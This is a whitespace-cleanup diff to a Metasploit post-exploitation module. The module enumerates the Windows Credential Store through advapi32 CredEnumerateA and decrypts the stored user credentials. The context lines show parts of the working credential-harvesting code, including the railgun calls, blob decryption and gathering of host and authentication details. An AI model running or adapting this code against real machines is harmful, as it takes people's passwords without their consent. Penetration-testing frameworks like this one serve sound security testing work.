@@ -20,7 +20,7 @@ class Metasploit3 < Msf::Post
 			'Description'     => %q{
 					This module will enumerate the Microsoft Credential Store and decrypt the
 				credentials. This module can only access credentials created by the user the
-				process is running as.  It cannot decrypt Domain Network Passwords, but will 
+				process is running as.  It cannot decrypt Domain Network Passwords, but will
 				display the username and location.
 			},
 			'License'         => MSF_LICENSE,
@@ -74,7 +74,7 @@ class Metasploit3 < Msf::Post
 		end
 		return str_data || "Error Decrypting"
 	end
-	
+
 	def decrypt_blob(daddr, dlen, type)
 		#type 0 = passport cred, type 1 = wininet cred
 		#set up entropy
@@ -112,7 +112,7 @@ class Metasploit3 < Msf::Post
 
 	def gethost(hostorip)
 		#check for valid ip and return if it is
-		return hostorip if Rex::Socket.dotted_ip?(hostorip) 
+		return hostorip if Rex::Socket.dotted_ip?(hostorip)
 
 		#convert hostname to ip and return it
 		hostip = nil
@@ -159,7 +159,7 @@ class Metasploit3 < Msf::Post
 
 			ip_add= gethost(host)
 
-			unless ip_add.nil? 
+			unless ip_add.nil?
 				auth = {
 					:host => ip_add,
 					:port => port,
@@ -185,10 +185,10 @@ class Metasploit3 < Msf::Post
 		#call credenumerate to get the ptr needed
 		adv32 = session.railgun.advapi32
 		ret = adv32.CredEnumerateA(nil,0,4,4)
-		p_to_arr = ret["Credentials"].unpack("V") 
+		p_to_arr = ret["Credentials"].unpack("V")
 		arr_len = ret["Count"] * 4 if is_86
 		arr_len = ret["Count"] * 8 unless is_86
-		
+
 		#tell user what's going on
 		print_status("#{ret["Count"]} credentials found in the Credential Store")
 		if ret["Count"] > 0
